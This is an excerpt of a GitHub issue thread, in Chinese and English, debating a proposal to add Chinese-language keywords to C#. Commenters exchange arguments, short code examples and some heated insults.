然而如果把“汉化C#关键字”就称为汉语编程，简直和打磨个芯片就称为“汉芯”一样了。"
2538	但什么都有个开始，从哪里开始呢，现在有人汉化官方资料，有人写中文教程，有人的程序注释都是中文，这都是中文编程的一部分，当然也包括 汉化关键字及更重要的汉化标识符
2539	需要大量符号和空格修饰的中文编程语言都是邪教
2540	英文编程不需要符号或空格。这是什么智商？为什么还搞出个驼峰命名来呢？说中文逻辑表达不好，不适合编程，但英文的歧义也不少怎么不用歧义更少的法语？自己顶。
2541	"@htwx @pigfromChina @SamPeng87 我个人并不是很赞成在这个问题上扯到民族性，或者民族主义的问题。
@Kabie 我不是很理解你所说的”然而如果把“汉化C#关键字”就称为汉语编程，简直和打磨个芯片就称为“汉芯”一样了。“。汉语编程，英语编程，都属于自然语言编程，目前NLP还在研究很多非常简单的任务，自然语言编程目前来看还遥遥无期，暂时也不可能有任何工业实现。如果你是说语法的组织贴近汉语的话，我觉得可以，但是其实这并不属于一个编程语言的关键特性。
@qwas982 我觉得你的issue扯的东西太远了。能不能就编程语言提编程语言的事。

下面是我的看法。我觉得一个比较合理的建议是请求为.NET的语言和IDE添加一些特性，包括：
1. 根据用户语言自动将源代码中的关键字在呈现时翻译为对应语言
2. 允许用户在注释中添加一些i18n信息，使得源代码中标识符可以被IDE翻译并以多种语言呈现
3. 完善IDE对于1, 2的自动补全

尽管关键字的语言对于编译器不是什么重要的事情，但是个人感觉直接允许源代码中的关键字具有多种语言还是容易引发意想不到的副作用。

另外这些特性的是否值得实现就另说了，因为语言关键字数目并不多，记忆量本来也不大，而变量名目前并无语言限制。"
2542	"I was shocked by your repo, https://github.com/qwas982/On-the-realization-of-communism-with-open-source  

![image](https://user-images.githubusercontent.com/12227130/31614838-49eb6f2c-b24d-11e7-861f-1e4646b5f1a4.png)

# So shocked! 

# You scared me to jump!( 你 `TMD` 吓了我一大跳!)"
2543	"我觉得这里有很多人,对中文编程,和我说的汉化标记和标示符的观点,其理解和解读已经进入了一个误区.

他们总是把字符与英语挂钩,而没理解到我讲的重点,文化存在于语言里,思想存在于文化里,他们还在一个劲地强调翻译文档这种舍近求远,舍本逐末的思想.我很想反问,如果你真的已经认同了英语文化,不在乎几个关键字,那你大可以用你的英语去阅读英文文档嘛,何须还需要翻译一遍呢? 看起来你们理解程序中蕴藏的思想(业务逻辑)还是用的中文汉字文化嘛.就算你们把关键字或代码词汇都当做字符,我倒是很想问,你们理解的时候,是怎么理解的.
人肉编译器?人肉英语文化翻译机?
这挺好的,这没什么呀,这是你们选择的自由,我也没有阻止过你们的观点呀,
但是与我一样表达想用中文文化编程的,用汉语思想编程的兄弟朋友想探索和探讨中文编程,你们为什么要阻止我们呢?所以说,搞到底,你们好像还没搞清楚我是在向什么对象提出这一倡议和讨论的是吧?
你们觉得你们能代表一切?真有意思.

@htwx  
兄弟,这些家伙就是一群望文生义的傻X,甚至,他们还一直在注重外表和外貌的意义,而我一开始就没强调这一点.
看了你的实现,我支持你.真正实践过的人,得到结论绝不是他们那样,可以看出,对于中文编程,他们没实践过,所以一直在自我感觉良好,别人都是垃圾,他们自己是完美的存在."
2544	易语言不就是中文的嘛，也没见怎么普及开来
2545	为什么民科就是不能理解所有人都在强调的【英文or中文根本就不重要】呢，为什么民科觉得词汇量连小学英语要求都没达到的编程语言会妨碍中国人学编程呢，难道一门编程语言最重要的不是他的生态吗。。
2546	Ｗhy I am still tracking this issue when the notifications have spammed my mail box already.
2547	@Huang-Libo 现在信息已经共产了。对于物质方面，他又没提出啥可行的方案。www
2548	"@Antinomy20001 英文或中文根本不重要你的论点怎么得来的？小学的英语词汇量怎么统计的难道就是几个关键字么？现在知道中国有200w+程序员水平怎么还这么底下了，现在的这批程序员脑子不好使。没得救，不管他是什么水平的。我还没听说那个中国裔的真正能成为行业顶尖的。所有的都包含就是打杂的水平。
"
2549	"[ChTypeScript](https://gitee.com/HTWX/CHTypeScript)
![1](https://user-images.githubusercontent.com/6562192/31620667-70494324-b2ca-11e7-8cde-2fbd65584356.png)
![2](https://user-images.githubusercontent.com/6562192/31620668-70858dac-b2ca-11e7-9add-ebc3f5fd95b9.png)
![3](https://user-images.githubusercontent.com/6562192/31620669-70becf90-b2ca-11e7-9d1c-9a9662a3bbe6.png)
![4](https://user-images.githubusercontent.com/6562192/31620670-70f394f0-b2ca-11e7-9664-5d6bff15ee2a.png)
![5](https://user-images.githubusercontent.com/6562192/31620671-7125ef90-b2ca-11e7-9958-96124d6555b4.png)
![6](https://user-images.githubusercontent.com/6562192/31620672-715b38b2-b2ca-11e7-8668-8a114e0320b0.png)
![7](https://user-images.githubusercontent.com/6562192/31620673-718fc122-b2ca-11e7-82df-a4c1e9b49fef.png)
![8](https://user-images.githubusercontent.com/6562192/31620674-71cc2ba8-b2ca-11e7-8048-7efcb5e35da2.png)
![9](https://user-images.githubusercontent.com/6562192/31620676-721526aa-b2ca-11e7-8933-40f20a95ce41.png)
![10](https://user-images.githubusercontent.com/6562192/31620677-7246f63a-b2ca-11e7-9c9d-a6a02e425828.png)
![11](https://user-images.githubusercontent.com/6562192/31620678-7278ecc6-b2ca-11e7-94dd-5f145ac2fcc8.png)
"
2550	"@qwas982 我们强调过了很多次.没有什么汉语思维和英语思维.数学思维才是本质。

写程序/HDL是干嘛?不就是为了实现算法和业务逻辑嘛.

所以说,你弄一个预处理器把关键字全部替换掉也没什么影响,更没什么难度.既然你有这样的想法,为什么不自己先弄一个预处理器替换掉这些关键字,或者弄个语言的前端生成IL/LLVM IR?与其在这里被人吊打,不如你自己去汉化个语言,发布出来?

至于我个人对这些英语关键字的态度其实是很随便的.

不过，跟你说,你不要想着用中文关键字替换掉了英文关键字,就能上至99,下至刚会走就能编程.编程是干啥?自然是教会电脑执行业务逻辑和算法.你说中文编程能去掉直观理解的障碍,我看倒是未必.

比如说自动控制环节的PID/2P2Z控制器.CORDIC正弦逼近算法.你别说用什么特定的编程语言实现出来了.没学过信号的人看到这一坨控制框图和计算公式/幅频图都和天书一样.就算实现全都是用全中文关键字的语言写的,没学过算法、高数、数据结构、信号的人还不是看不懂……如果你不知道什么是看不懂的全中文天书，建议你去看工尺谱和古琴减字谱。你就知道什么是都是中文，但是都看不懂。

而学过了这些东西的人记几个英文关键字有什么难度。所以我们是说，你这样替换了关键字，复杂的算法也不会因为这样，就能够跳过基础知识的学习让人能够直观理解。更不可能做到上至99，下到刚会走就能轻松上手。除非他们只写个“你好世界”。

最后说一句，你才是被表象蒙蔽了双眼的人。

-------------------------------------------

@qwas982 We have wasted many floor to prove that THERE's NO DIFFERENCE BETWEEN CHINESE AND ENGLISH programming way. The basis of programming is math or algorithm.

Maybe you want to ask me why programming or writting HDL. I will reply you that I just want to realize my business logic or algorithm.

Therefore, you can make a pre-processor to replace Chinese keyword to English keyword. It is not difficult, or I will define it is a easy-task.  Maybe you want to try some advance realization, for example, make a new frontend for your Chinese keyword PL, and generates IL or LLVM IR code. Talk is cheap, show me the code and theory.

As for me, I 'm not interested what language constructs these keywords.

But, my opinion is that, a Chinese keyword PL will make anyone from the elders to the young baby to understand the program. In fact, programming is to teach computer how to calculate or control. You're totally on a WRONG WAY.

For example, Do you know PID/2P2Z control loop or CORDIC trigonometric function? If a person that dont know any knowledge about signal, signal processing, advanced mathematics, automatic control theory, data structure, computer architecture even analog circuit theory. Although you can give he or she formula about these algorithm. Obviously, he or she will not understand these formula, and the program will like heavenly-script in his or her eyes. If you dont know what script is written by Chinese and you will not understand it, please refer to Gongche notation or Jianzi notation. That will teach you a lesson.

If a person have learned these knowledge, he or she will definitely think English keywords is not a problem on programming. Althrough you replace all keywords to Chinese language. But algorithm and formula will NOT CHANGE. Programmers still needs to learn algorithm and basic knowledge such as advanced mathematics, data structure, computer architecture, etc. Otherwise, ""Hello world"" program is the top level for this person or ""programmer"".

The last word I want teach it to you is, you 're the one that deceived by phenomena."
2551	"这个楼主果然是看到与自己不同意见就不加思考点反对的民科。这种人， 我见得多啦。

既然执迷不悟，那也随便你怎么搞~如果你能搞出来生态环境更好，更省字的PL和库甚至IP核心。业界肯定会用，不过看这架势，估计是不行啊。除非你证明你有这个能力。

--------------------------------------------------------------------------


This issue creator is a objection machine gun that fires to anyone who don't agree his opinion. I have seen many many person like him. 

Do whatever you want to do. If you can create a PL and library that has the most advanced eco-system or IP core, industry will definitely utilizes it. 

But, in this time, it seems that you can't do this anyway. unless you prove it."
2552	我觉得就一个简单问题，你数学课本全中文的也不见得几个陈景润啊？算法导论也有中译版，多少人能完全理解的？你以为英语母语系的编程就很容易？咱能做点实事不？
2553	"@lxdlam 
我觉得就一个简单问题，你数学课本全中文的也不见得几个陈景润啊？算法导论也有中译版，多少人能完全理解的？你以为英语母语系的编程就很容易？咱能做点实事不？
 
把中学的课本翻译成阿拉伯文 你看一下你还是现在这个水平不


"
2554	@lxdlam 语言本来就是要人看得懂的!既然楼主有这个想法 又有什么不好呢？
2555	"@fyyxgame 哎，就那么死板的关键字。硬背都背会了。这东西又不像数学课本之类的玩意儿一样需要你掌握大量的英语知识。（虽然说行业前沿的东西还得看英文期刊）

影响你程序写的好不好的，根本不是用什么语言去写程序。而是你的数学思维和算法实现！具体这些东西，没有任何数学基础的人，就算他能看懂每个字。连起来也看不懂算法。

比如说，我拿一个FFT的蝶形运算来说。没学过信号的人只看得到交叉，乘法，乘加和循环。可能乘法在某些机器上还效率低，要对数再用指数表移位的方法实现。这么一坨东西就算是把所有关键字和符号都改成中文。没学过信号的人还不是照样啥也看不懂。"
2556	"@fyyxgame
你们要讨论能不能围绕问题本身来，陈景润那时候学习的资料中英都有，不见得人家因为非母语阻碍了数学进步，倒是现在有些学生数学水平不尽如人意，同样是学习，为什么优秀的人能学的好？

一个简单的对比是，在这样的人口基数下，各自都有母语教材，为什么到最后中国的优秀数学人才不能大大超过英语语系的？这真的因为母语教材问题吗？

你们辩论一直试图偏离问题核心，所谓中英文编程完全就是伪概念，影响编程技术和水平的不是靠所谓中英文，是靠背后的数理逻辑和业务思维，优秀中文翻译教材那么多，有那么多优秀人才出现吗？"
2557	@lxdlam 完全同意！
2558	"@lxdlam 

看来你对编程的理解还不够深,
编程编的就是文化内涵,你竟然可以得出""`所谓中英文编程完全就是伪概念`""这样的结论,可见你不知文化为何物,请问你知道国学吗?
既然` 影响编程技术和水平的不是靠所谓中英文`，那请问,数理逻辑和业务思维的宿主是什么,它们存在于哪里.你别光是在这里一厢情愿的表达**还没学会走就想飞**这种观点啊.这种东西前面已有过讨论."
2559	"@rgwan  帮助文档需要大量的英语支持!
@lxdlam  顶尖级人才不一定会多 但是会减少一些想入门并入不了门的人，
比如我 我初中就辍学了，我爱好编程  但是我英语真的不行 我开始学cpp  vb  单词  里面的 hello world 我都记不住 还得跟着教程键盘一个个的安， 它不仅仅是几个关键字的问题   他还有大量的api函数 等 需要帮助文档 ! 比如NeemDeTijd()   你知道什么意思么？（告诉你荷兰语 我百度翻译的）取时间() 也就是 getTime()   翻译它就是为了让更多的人看的懂而已！其实编程并不是要求那么高的 往往是 这些看不懂的单词函数 帮助文档 阻碍了这些人学习编程!"
2560	"@fyyxgame 
是的,兄弟,字符背后就代表的是基于这字符的语言的文化内涵,而文化又是根植于一个种群的思想主旨.中国人(母语为汉语的中国人)看英文或西文字母词汇,必定是先在脑内进行了一轮翻译,然后才理解其词汇的意思的.

**用英语写代码对于母语不是英语的人，需要承担两种文化，两种思考方式的频繁 [ 转换／翻译 ] 的代价．会把你搞成精神分裂．双重人格．
对于母语写代码的人，他是直接理解程序语言的语义，对于非母语写代码的人，他需要先翻译一遍这门语言到自己的母语，然后才能理解到其意思** 

语言是［形］，语义是［神］．［形］看得到，听得见，摸得着，［神］不可见不可听不可闻．
对于英语为母语的人，他们文化中的［神］与他们创造的编程语言中的［神］是点对点一对一同步的，无需翻译，１就是１　，２就是２．
对于母语不是英语的人，比如汉语者，他们想要理解非母语的编程语言的［神］，**需要三道翻译**．
```
第一道是将英语的［形］翻译为汉语的［形］，于是理解了形表达的神，也就是语义和镶嵌在其上的文化．
第二道是将编程语言的［形］翻译为英语的［形］，这样才能将编程语言的［神］传递到英语的［神］里．
第三道是将前两道之结果比对，比对的过程中需要双向翻译，如果三个语义是相等了，那就是［神］已经联通了，你可以想象是打通了任督二脉，或者大禹治水用疏不用堵中的那个疏，疏通的意思．编程语言的［神］顺利地流到了汉语的［神］里来，于是你就理解了某一句代码的意思．
```
其流向是这样的：编程语言的［神］→英语的［神］→汉语的［神］．"
2561	"@qwas982

国学能驱动功率器件么？国学能控制电机么？能让高铁跑起来么？能让信号灯正常联网工作么？能让电网同步么？能指导系统设计么？

理学、工学就是讲求数学，讲求理学、实践和经验的学科。和文学、文化是本质上就不一样的！怎么能够混为一谈？可笑！
"
2562	"@qwas982
你现在又想上升至哲学了，数学本身就是一种哲学形式存在，既然你也承认程序是一种文化表达，优秀的文化和其载体又有和关系？因为乐谱不是五线谱贝多芬名曲就不能震撼世界人民了吗？国际歌因为是法文原版就不能被各国人民传唱了吗？

不要在讨论问题的时候偷换概念，你如果真的懂数理逻辑和业务思维的存在方式根本不可能提出如此问题。到现在我倒想问问你，你提出的所谓把token换成中文，能够如何促进数理逻辑和思维的提升？"
2563	"@qwas982  不要拿什么中国人 什么的说事
我懂你啥意思 你平时想东西心里想的 都是中国话 如果是英语的需要转换到你想的那些在去做逻辑处理 相当于 给一个函数包了一层!
 语言就是为了让人看得懂的， 易语言论坛80多万人 呢 足可见 翻译一个主流的语言是多么的重要!"
2564	"@lxdlam 
你很好地证明了什么叫;一厢情愿的表达**还没学会走就想飞**

@fyyxgame
是的,兄弟,话糙理不糙.你说得对"
2565	"@rgwancommented 3 minutes ago
国学能驱动功率器件么？国学能控制电机么？能让高铁跑起来么？能让信号灯正常联网工作么？能让电网同步么？能指导系统设计么？

理学、工学就是讲求数学，讲求理学、实践和经验的学科。和文学、文化是本质上就不一样的！怎么能够混为一谈？可笑！
 :-1: 1  
 不管你什么学 都是建立在沟通之上  翻译一下代码让人看得懂这不就是沟通么？"
2566	"@qwas982 什么是理解，你来下一个定义？还有，我给个简单的例子，你说是“金氧半场效应管”好呢，还是""MOS""好？是“绝缘栅双极性晶体管”好呢，还是“IGBT”好？

我不一定需要每次看到这个器件或者画这个器件的时候去想到什么中文的器件名称。但是我肯定知道这个器件的特性和使用方法。理解这个东西，本来就是主观性的！"
2567	"@rgwan    什么是理解，你来下一个定义？还有，我给个简单的例子，你说是“金氧半场效应管”好呢，还是""MOS""好？是“绝缘栅双极性晶体管”好呢，还是“IGBT”好？我不一定需要每次看到这个器件或者画这个器件的时候去想到什么中文的器件名称。但是我肯定知道这个器件的特性和使用方法。理解这个东西，本来就是主观性的！
--
你这是一个极端的例子 我要是弄汉语的 我也可以用 MOS 边上注释 金氧半场效应管   当我想打这个变量或函数的时候输入首批 ide会给我提示和选项

"
2568	"@fyyxgame
兄弟，我看你是个明白人，不要被楼主带偏了。

为什么我们要使用所谓的英语编程，最大的问题是输入受到的阻碍最小。你想，我们中文等输入需要经过一道转换，而英文不要，所以英文效率是当下最高的，因为各种历史原因，要做到中文输入无障碍，说实话，真的不易。

其次，文档的确是需要翻译的重点，刚才我可能和你讨论主线不对，这个事情是每一个中文母语开发者都应该思考的问题，我们所需要的的确是更好的指导，这个事情我也在做，一直在参与各种翻译项目，尽自己全力。我们要做到更好的指导，帮助开发者更好的理解，这个才是促进非英语母语开发者更易的主力工作方向，而不是楼主那种浮于表面的办法。

实际上，开发过程中一般遇不到特别难得单词，你可以准备一本字典慢慢学习，补充补充总是好事。

祝你未来开发学习之路一路顺利！不要被楼主带偏了，他已经开始尝试使用各种话题来转移注意力了。"
2569	@fyyxgame 就那么几个关键字。我做的项目和案子还有大量中文注释，还看不懂只能说明你专业知识缺太多了，得补。
2570	"@lxdlam  事实上汉语编程并不能提高编程水平  他和英语编程的 区别就是字符串的区别!
你要说 汉字输入慢  我强烈建议你去 用一下易语言 内置的首拼输入法，目前我自己制作的ide 完全就是学的人家 汉字输入丝毫不会比英语慢! 最后一点 不要扯上什么母语 民族情怀！只会让人更恶心!"
2571	"@qwas982
此条之后我不再回复你

尝试使用一句看似正确的话掩盖你的无知，这种手段上面我见过你使用太多次。

真理是掌握在少数人手里的，前提是这得是真理。

让时间来证明一切吧。"
2572	"@rgwan
 就那么几个关键字。我做的项目和案子还有大量中文注释，还看不懂只能说明你专业知识缺太多了，得补。
--
有时候你函数 什么的写的明白 根本不需要看注释!
"
2573	"@fyyxgame
朋友,注意看这个 `lxdlam`  什么叫断章取义,以偏概全,千万不要中了他的套.
他其实就是在否定自己的文化,自己的母语.
换个角度看,如果实现中文编程,还需要去翻译别人的文档吗? 什么叫舍本逐末,他就是例子.
他的本意就是叫中国人去跟着别人的屁股跑,别人更新了什么软件的新功能或创造了什么新的东西,
最好也要疲于奔命地跟着别人.
他与那些典型的瞧不起汉语汉字的abc是一样的.

汉化token只是第一步,以后会不断地改进,如果没有第一步,那么,就连改进的对象都没有."
2574	"@fyyxgame
朋友，我劝你可以冷静冷静再来看这个问题。

首先第一点你我能达成共识是最好的，汉英语编程对编程水平提升帮助没有任何区别，只要理解了，即使是阿拉伯语也能写出优秀的可依赖的程序。

其次，输入效率的问题，对于一个相同的关键字，对于大部分人来说使用英语是的确要比使用中文输入略快，对于有经验的开发者来说更是如此，这一点可能你的体验不同。

最后，关于情怀问题，你可以说我扯了情怀，没问题，但是这就是我的真实想法，真正的开源精神不是去索取然后就走，而是取自己需要的，给自己能给的，我觉得这一点上并没有什么不妥。

今晚的几番交流看得出你是个有主见的人，希望你能坚持走下去，收获更好的未来。"
2575	"@rgwan
兄弟，我也是看了你的回复才决定也说两句的。

多的不说，这已经没意思了，这些手段你我在网络上见过太多。

你的回复写的很棒，我深表赞同。

我们可以在私下交流，不要打扰人家的issue了，祝你好梦。"
2576	@lxdlam  首先我得承认易语言确实问题很多很多  但是它的输入真的很快 丝毫不必英语慢 我强烈建议你去体验一下。本来不想回复的 祝诸位晚安 但是这个必须说一下！ 好了祝各位程序员好梦！
2577	"@lxdlam @fyyxgame 嗯，因为我主要是做硬件和信号处理方向的。个性比较直，说话比较冲。多有冒犯，请多包涵~

我对编程语言这个东西的关键字其实是没多大的兴趣的。生态好，编码简单，不容易写出bug的编程语言就是好语言。由于我做开发大多涉及底层算法，用的标准库不多。很多东西基本都是自己手写，所谓文档也基本都是器件手册和各类论文/实验数据。处于比较高度的自给自足状态，对高级语言大量依赖库和文档的情况其实基本没有切身体会。而且做这些开发的，数学功底是一定要非常强的（英语其实都比较无所谓）。很多算法实现完/优化完不留点（无论什么语言的）原型/公式/文档或者注释。没准过个把月就忘了这是干啥的了。因为经常会优化到面目全非。

但是我对楼主所谓体现文化这一点是有根本反对的。关键字替换并不能改变你写的算法的本质。都是加减乘除输入输出循环……用中文写，英文写，C写，C++写还是matlab写，画方框图或者写公式，都是加减乘除输入输出。而就这么几个关键字，是真的很死板的东西。是可以理解的，并不需要双重思维。

关于各类业界的术语，器件之类的，也有源自各种语言，各个国家的。比如说IGBT源自德国。变频器源自中国（VFD）或者日本（VVVF）等等等等。照这位楼主的说法，我不仅中式和英式思维，还需要日式和德式思维?

所以我说，这位楼主只知其表不知其里。内在，需要理解的东西，其实接触多了，也不需要翻译的~

@fyyxgame 不论如何，加油。这些死板的关键字是困不住一个有志于计算机或者电子的人的!"
2578	"我见过很多英语水平一坨屎的编程大神，英语为母语的美国人绝大多数也是不会编程的。
所以对有意愿编程的人而言英语水平不够成任何阻碍，对没有意愿编程的人即使将开发语言改成中文对他们也没有任何意义。"
2579	"最后来解答楼主的问题 “那请问,数理逻辑和业务思维的宿主是什么,它们存在于哪里.”

它们的宿主，当然是控制框图和数学公式（传递函数）。它们的意义，行为和实现并不因人思考所用的语言而发生任何的变化。就比如说一个PID控制器，让讲不同语言的人都做一次，完成的肯定是相同的功能。

它们的存在，当然存在于逻辑思维之中。世界各地的人们学习了必要的知识后都能够理解，同样不因语言而改变。各类被正确编程的机器也能够理解，因为程序也是它的载体。不论这个“程序”是用模拟电路搭出来的，还是数字电路搭出来的，甚至是机械组成的（比如瓦特蒸汽机的调速器），还是在不同的处理器上运行的。它们都完成相同的功能。"
2580	"LZ可以自己先写个parser做一个POC 用ANTLR这样的东西应该不难

问题是像in和out这种多含义的关键字 本身英文就意义不明确 更何况汉语呢？

而且遇到大型的开源项目 贡献者来自全球各地 因为汉语本身的学习难度就很大 如何能保证“汉化”的C#代码可以被其他地区的贡献者理解以及对项目做出贡献？

----------

Before asking MS to do something this adventurous, I think OP should try writing a parser/translator as a POC. It's not hard using ANTLR.

One problem, though, is that there are keywords like ""in"" and ""out"" have multiple meanings in different context. The meaning is not already comprehensive by the their representative English words. I could not see an easy way to accomplish this in Chinese as a native speaker. 

Another problem is open source projects. There are potential contributors all over the world. How should the other contributors understand ""localized"" C# keywords and variable names and contribute to the project, given that Chinese is a well-known difficult language to learn?"
2581	"@vbcodec Please keep the discussion respectful and on topic. See https://dotnetfoundation.org/code-of-conduct . The rules were crafted so new participants don't feel like this is a ""hostile environment."" Sometimes when people communicate, even if they are not offended (perhaps even having a good time), their expressions can discourage other people from participating. The Code on Conduct addresses the most likely ways in which this occurs so we can be a productive and inviting community."
2582	"@htwx 
1、对于语言本身的英文部分，只包含了部分简单单词，甚至不存在英文语法，所以其本身仅仅是符号化的逻辑描述，对此是基于中文还是英文并没有本质区别。对于编程语言的学习能受到英文水平影响的只有其社区内容。
2、看清楚逻辑关系，【连小学英语词汇量都没达到】指的是关键字，因为qwas982指的所谓中文化C sharp就是中文化关键字。
3、程序员水平是否是【使用非中文逻辑的编程语言】因素造成的，请做出数据分析再下结论。"
2583	"Downvote for personal attacking. Arbitrary conclusions for assuming English-programming Chineses not to understand Chinese Culture.

---

我投了反对票，因为您在提问中使用了人身攻击。您不能默认所有使用英文编程的人都不识国学、不认中国文化。 

其次，汉语分词、语义解析都没有成熟的方案，而编程中使用的少量关键字会使得文本割裂而不可读，得不偿失，也无法获得「传播中国文化」的目的。

e.g. 举例：

```haskell
qsort :: Ord a => [a] -> [a]
qsort [] = []
qsort (x:xs) = qsort (filter (<x) xs) ++ [x] ++ qsort (filter (>=x) xs)
```

但是尝试中文化的时候：（我换上了中文标点符号）

```
快速排序 ：： 有序 甲 =》 「甲」 -》 「甲」
快速排序 「」 = 「」
快速排序 （首项：剩余） = 快速排序 （筛选 （《首项） 剩余） ++ 「首项」 ++ 快速排序 （筛选 （》=首项） 剩余）
```

这毫无意义，并且可读性并没有英语版本好。
"
2584	"噢，我的朋友，这个项目是开源的，您可以把他叉出来，实现中文关键字，然后把新语言叫做 “匚井”。

---
Oh, my friend, this project is open source, you can fork it and implement the Chinese key words you want, and name you new language FANG JING.
"
2585	"@Henrycobaltech 
too sad that he have no technological skills so he can only ask innocent people to do it for him & call other innocent people racist :)"
2586	"@fyyxgame 
你可能不认识[Rust](https://www.rust-lang.org/zh-CN/documentation.html). 本地化的文档比 ""中文编程"" 有意义多了.
现在即使你们搞这个大新闻, 现在已经几乎50年了, 辣麽多库, API, 都是英文的.
__可不可能完成翻译? 我们要不要把自己的库分享给世界? 我们能不能使用世界所有不同母语的人皆用一个统一语言标准实现, 代码风格的库?__
现在已经是这样了. 你们打算把 ""中文编程"" 成为世界标准吧. "
2587	"@gafter 
_This issue should be closed&locked now._

There is already __too much meaningless and/or off-topic comments__ to this issue, and some of them even __do personal attacks__.

Even the creator of this issue, @qwas982 , does personal attacks
> @jonechenug
Dictatorship
autocratic?

>@qrli
@jonechenug
@shisoft
@qgy123
@micli
@Meowv
@Means88
@bctnry
这些账号，如果是中国人或使用汉语的人，100%是逆向种族主义者，他/她们瞧不起中文字符，瞧不起自己的文化，可能是跪久了，已经站不起来了。不过是一些没骨气的软蛋罢了。已经习惯于依附于别人，软弱无能的弱者思维罢了。
__These accounts, if the Chinese people or the use of Chinese, 100% is the reverse racists__, they despise Chinese characters, despise their own culture, __may be kneeling for a long time, has not stood up. It's just some spineless soft candy. have been accustomed to cling to others, weak and incompetent thinking.__

If this conversation continues, __more and more comments that (have no relationship to C#)|do personal attcks will be append.__
Please close this issue&lock conversation now.  😃 

_(BTW: I'm sorry for my bad English.)_"
2588	"发现事情不对了，删跑的倒挺快，真心节奏大师7102炫酷版.
Stop faking yourself, you make me laugh"
2589	"@qgy123 

我只是整理了文档,就说我 `发现事情不对了，删跑的倒挺快，`? 你们这帮小人啊,你们的行径挺适合你们自己自我催眠的呢
"
2590	"@pigfromChina

既然贴出了我回复你们对我的""谩骂,嘲讽和羞辱"",那咋不把你们自己羞辱谩骂嘲讽他人的评论也贴出来呢?果然是小人行径."
2591	兄弟，你冷静，我只是说有个项目叫易飞扬，已经死掉了，和你说的东西很像，你自己就主动圈我出来，给我扣了一顶逆向民族主义者的帽子，请问您这不是没事找事么，说你删跑的快，非要把你删的东西截个图贴出来您才满意？大家时间都宝贵，停止您这些没有意义的事好么？你圈我一下，我这边就一封邮件，您不嫌烦，我还烦呢
2592	"@gafter

我需要澄清一下,这几个账号` pigfromChina  bctnry `(当然,还有一些)是在这里反对我的观点并进行人身攻击最多的.我初始的时候,并没有在意他们的攻击,但是这反而让他们得寸进尺.我觉得有必要说明下他们的丑恶行径.

`pigfromChina`  他只是贴出了我回复他们对我的""谩骂,嘲讽和羞辱"",但并没有把他们自己,羞辱谩骂嘲讽他人的评论也贴出来呢?他们的行为如何,我无须多言.

翻译用的是谷歌翻译


///

I need to clarify that some of the accounts of `pigfromChina, bctnry` (of course, there are some) are here against my point of view and carry out the most personal attacks. I initially did not care about their attacks, but this instead So that they are insatiable and I think it is necessary to explain their ugly behavior.

`pigfromChina` he just posted my reply, (they against my"" abuse, ridicule and humiliation ""), but did not put their own, humiliation and abuse of others' comments also posted it? How their behavior, I Needless to say.

Translate with Google Translate"
2593	"There is no Chinese characters in tranditional ASCII.
Chinese-character-keyword programming requires UTF-8 support and programmers switch IME to input Chinese-character keywords.

And IME need more keypress to input Chinese words than English, like this code in English
```
int a
```
or this in Chinese
```
整数 甲
```
You only need press [I] [N] [T] [Space] [a] in English-character-keyword programming while you have to press [Z] [H] [E] [N] [G] [S] [H] [U] [1] [Space] [J] [I] [A] [1] in Chinese-character-keyword."
2594	"@qgy123  
你别只挑对自己有利的说呀,我看点反对(大拇指向下)你不是也挺积极的吗.敢做不敢当了?"
2595	@qwas982 我不在乎你把我们对话的全部截图都发出来，然后请您别没事圈我了，懒得理你，有本事就什么都别删，这些东西都挂在者，理用不着您来评，群众心里自有数
2596	"@qgy123 
我删什么了我?你是不是有什么问题啊?你才是在这里没事找事,你不想理睬,你大可以一开始就不用来回复,觉得无趣还来?你是不是有什么问题啊?
如果你觉得我对你误伤,那你自便

///

github也不是你家开的,谢谢"
2597	@qwas982 github你家开的啊，继续你的表演，我屏蔽你了，再见
2598	"@KaneGreen 
如果是解析-press 中文字符,自然就是解析汉字了啊,还解析拼音字母干什么?何况现在汉化token只是第一步,以后会不断改进的,有很多人看不明白这一点,他们认为汉化token=中文编程,甚至自然语言编程.

并且,你说的,是等待中文编程已经发展到一定阶段或程度的时候才是考虑的事,现在什么都没有,一穷二白,你就开始谈 创造某种新型的中文编程语言,你觉得合适吗?

///

If it is analytic -press Chinese characters, naturally is the analysis of Chinese characters, ah, but also parse the phonetic alphabet do? Moreover, the finished token is only the first step, will continue to improve, there are a lot of people do not understand this, they think [use Chinese characters token = Chinese programming], and even natural language programming.

And what you say is waiting for Chinese programming has been developed to a certain stage or degree when it is considered, and now nothing, a poor and white, you began to talk about creating a new type of Chinese programming language, do you feel right?"
2599	"自己去写码啊
有这个时间来github撕逼不如好好背背红宝书，好好学一下编程语言
你是没考虑过全球多国协作是吗？合着我用中文别人用日文我就不能交流了？FNNDP！
自己不写还在这里瞎bb的人脑子是有问题吗？
中文编程在目前国际化的大背景下只能造成编程圈分裂，实在看不出对软件行业有什么帮助
综上所述，题主就是傻逼
祝编安
--~~~~"
2600	"@gafter

you can see,又来了一个攻击我的, `boblao0714`  

in chinese,撕逼-瞎bb-脑子是有问题吗-傻逼 等形容词就带有羞辱,谩骂,嘲讽.

////


you can see, again a attack on me, boblao0714

in chinese,撕逼-瞎bb-脑子是有问题吗-傻逼 These adjectives With humiliation, abuse, ridicule."
2601	"被“想用开源实现共产主义”的dalao点草了呢
哈哈哈
我好怕怕啊
除了说话啥都不会的辣鸡还来点草我？还要用google翻译才能在github谈笑风生的人真的没救了
这种人就是知道自己不行只能靠我两句脏话批判一下
lol"
2602	"@qwas982 

说了半天，所谓写程序就是实现算法功能。你愿意，拿穿孔纸带上打机器码，然后摇进电脑都没人管你。语言这种东西，也就是个抽象，一组助记符。不懂数学和算法的人能看懂程序才怪咧。先不说程序不程序的问题，您先把零阶保持的拉普拉斯变换求出来再说，要不你也可以做一个证明，为什么积分微分调制器超过2阶就不稳定。

这些东西可都是纯逻辑和数学的东西，可是和一个人用什么语言说话，用什么编程语言编程毫无关系的~

我就描述一下，1阶的积分微分调制器，用""丙正正""语言就是这样的：

单精 积分 = 0;
位 调制器（单精 输入）
{
累加器+=输入;

若(累加器>0)
{
累加器-=1.0;
返回 1;
}
非
{
累加器+=1.0;
返回 0;
}
}

这可是纯中文哟，您先说明白这段代码是干啥的。再把这段代码的极点零点给分析清楚了。计算一下量化误差和信噪比曲线，再来讨论中文编程是否有助于母语是中文的人看懂程序。

如果这位dalao对高数和复变/计组毫无概念的话。就别在这里现世了，再继续回复脸只会被打的更惨，还浪费了宝贵的数据存储空间和网络带宽，这是很不好的~回炉重修基础知识吧！万丈大楼不是靠想出来的！

---------------------------------------------------------------

